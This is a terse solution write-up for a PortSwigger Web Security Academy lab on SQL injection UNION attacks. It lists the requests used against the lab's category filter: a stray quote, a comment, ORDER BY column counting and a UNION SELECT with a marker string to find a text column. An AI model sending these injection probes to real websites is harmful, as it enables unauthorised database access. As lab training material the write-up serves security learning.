#Lab: SQL injection UNION attack, finding a column containing text

#https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

```bash
GET /filter?category=Lifestyle'
```
```bash
GET /filter?category=Lifestyle'--
```
```bash
GET /filter?category=Lifestyle' order by 3--

GET /filter?category=Lifestyle' order by 4--
```
```bash
GET /filter?category=Lifestyle' UNION SELECT NULL,'MnaBNz',NULL --
```
